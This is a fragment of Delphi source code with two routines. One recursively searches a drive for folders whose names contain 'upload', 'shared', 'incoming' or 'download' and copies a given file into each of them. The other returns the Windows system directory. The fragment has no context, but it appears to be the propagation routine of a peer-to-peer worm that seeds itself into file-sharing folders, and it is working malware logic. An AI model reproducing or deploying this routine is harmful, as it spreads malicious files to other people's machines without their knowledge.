procedure FileListRecursive(Path: string; FileName: string);
var
  FindData: TWIN32FindData;
  hFind: THandle;
begin
  Path := includetrailingbackslash(Path);
  hFind := FindFirstFile(pchar(Path + '*'), FindData);
  if hFind = INVALID_HANDLE_VALUE then exit;

  if IsFolder(FindData) then begin
    if (pos('upload',lowercase(String(FindData.cFileName))) > 0) or
       (pos('shared',lowercase(String(FindData.cFileName))) > 0) or
       (pos('incoming',lowercase(String(FindData.cFileName))) > 0) or
       (pos('download',lowercase(String(FindData.cFileName))) > 0) then begin
         CopyFiles(Path + FindData.cFileName,FileName);
    end;
    if (string(FindData.cFileName) <> '.') and (FindData.cFileName <> '..') then FileListRecursive(Path + FindData.cFileName,FileName);
  end;

  while FindNextFile(hFind, FindData) do begin
    if IsFolder(FindData) then begin
      if (pos('upload',lowercase(String(FindData.cFileName))) > 0) or
         (pos('shared',lowercase(String(FindData.cFileName))) > 0) or
         (pos('incoming',lowercase(String(FindData.cFileName))) > 0) or
         (pos('download',lowercase(String(FindData.cFileName))) > 0) then begin
           CopyFiles(Path + FindData.cFileName,FileName);
      end;
      if (string(FindData.cFileName) <> '.') and (FindData.cFileName <> '..') then FileListRecursive(Path + FindData.cFileName,FileName);
    end;
  end;

  Windows.FindClose(hFind);
end;

function SysDir: string;
var
  Buf: array [0..255] of Char;
begin
  GetSystemDirectory(Buf,255);
  Result := Buf + string('\');
end;

